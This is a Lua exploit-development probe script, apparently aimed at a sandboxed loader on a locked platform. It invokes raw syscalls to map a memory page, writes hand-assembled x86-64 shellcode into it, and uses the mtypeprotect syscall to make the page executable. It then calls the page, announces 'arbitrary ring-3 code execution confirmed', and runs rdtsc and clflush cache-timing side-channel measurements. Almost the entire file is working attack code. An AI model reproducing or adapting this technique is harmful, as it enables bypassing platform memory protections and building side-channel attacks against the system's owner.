-- CRASH_CLASS: MEDIUM (executes its own bytes; a fault takes the loader down)
-- PROBE 1245c: make an anonymous page executable with mtypeprotect and call it.
-- 1245a: mmap(prot=7) page is readable+writable but a call into it faults at
--        RIP=page (so PROT_EXEC at mmap time is not honoured).
-- 1245b: the same fault fired on a deliberate pre-test, which killed the loader
--        before mtypeprotect ran. This probe does NOT pre-test.
-- Probe 44a (2026-10-16) measured that after mmap(prot=3) + mtypeprotect(585) a
-- NOP sled executes. This probe adds the missing return channel
-- (native.fcall_with_rax returns rax) so the shellcode's own value is visible.
print("=== PROBE 1245c: mtypeprotect exec + rdtsc ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function poke(addr, bytes) for i=1,#bytes do wb(addr+i-1, bytes[i]) end end
local function toaddr(v) local h,l=hilo(v) return l + h*4294967296 end
local function peek(addr,n) local s="" for i=0,n-1 do s=s..string.format("%02X",N(memory.read_byte(addr+i))) end return s end

print(string.format("[0] pid=%d", N(mk(20)())))

local page = nil
do
  local ok, v = pcall(function() return mk(477)(uint64(0), uint64(0x8000), uint64(3), uint64(0x1002), uint64(-1), uint64(0)) end)
  if ok then page = toaddr(v) end
end
if not page or page <= 0 then print("[-] mmap FAILED "..ES()) print("=== DONE ===") return end
print(string.format("[1] rw page at 0x%X", page))

local CODE = {
  ret1234 = {0xB8,0x34,0x12,0x00,0x00,0xC3},
  rdtsc   = {0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0xC3},
  flushed = {0x0F,0xAE,0x3F,0x0F,0xAE,0xF0,0x0F,0xAE,0xE8,0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0x49,0x89,0xC0,0x48,0x8B,0x07,0x0F,0xAE,0xE8,0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0x4C,0x29,0xC0,0xC3},
  cached  = {0x0F,0xAE,0xE8,0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0x49,0x89,0xC0,0x48,0x8B,0x07,0x0F,0xAE,0xE8,0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0x4C,0x29,0xC0,0xC3},
}
poke(page, CODE.ret1234)
print(string.format("[2] code bytes: %s", peek(page,6)))

print("[3] mtypeprotect(585) on the page")
local ok3, v3 = pcall(function() return mk(585)(uint64(page), uint64(0x8000), uint64(7)) end)
print(string.format("    (addr,len,7)   ok=%s ret=%s err=%s", tostring(ok3), tostring(ok3 and N(v3) or v3), ES()))
local ok4, v4 = pcall(function() return mk(585)(uint64(page), uint64(0x8000), uint64(3), uint64(7)) end)
print(string.format("    (addr,len,3,7) ok=%s ret=%s err=%s", tostring(ok4), tostring(ok4 and N(v4) or v4), ES()))
print(string.format("[4] bytes intact: %s", peek(page,6)))

print("[5] execution test: fcall_with_rax(page) should return 0x1234")
local ok6, r6 = pcall(function() return native.fcall_with_rax(page, 0,0,0,0,0,0,0) end)
if not ok6 then print(string.format("    CALL-FAIL %s", tostring(r6))) print("=== DONE (no exec) ===") return end
print(string.format("    call -> 0x%X  EXEC=%s", N(r6), tostring(N(r6) == 0x1234)))
if N(r6) ~= 0x1234 then print("=== DONE (wrong value) ===") return end
print("*** ARBITRARY RING-3 CODE EXECUTION CONFIRMED ***")

print("[6] rdtsc at CPL3")
poke(page, CODE.rdtsc)
local a1, t1 = pcall(function() return native.fcall_with_rax(page, 0,0,0,0,0,0,0) end)
local a2, t2 = pcall(function() return native.fcall_with_rax(page, 0,0,0,0,0,0,0) end)
if not (a1 and a2) then print(string.format("    RDTSC-FAIL a1=%s a2=%s", tostring(a1), tostring(a2))) print("=== DONE ===") return end
print(string.format("    tsc 0x%X then 0x%X delta=%d", N(t1), N(t2), N(t2)-N(t1)))

print("[7] cache-timing signal on a data line")
local line = page + 0x2000
poke(line, {1,2,3,4,5,6,7,8})
local function trial(entry, tag)
  local vals = {}
  for i=1,9 do
    local okk, vv = pcall(function() return native.fcall_with_rax(entry, 0, line,0,0,0,0,0) end)
    if not okk then print(string.format("    %s FAULT %s", tag, tostring(vv))) return nil end
    vals[#vals+1] = N(vv)
  end
  table.sort(vals)
  print(string.format("    %-8s min=%d med=%d max=%d", tag, vals[1], vals[5], vals[9]))
  return vals
end
poke(page, CODE.cached)
local cv = trial(page, "cached")
if cv then
  poke(page, CODE.flushed)
  local fv = trial(page, "flushed")
  if fv then print(string.format("    signal = %d cycles", fv[5]-cv[5])) end
end
print("=== DONE ===")
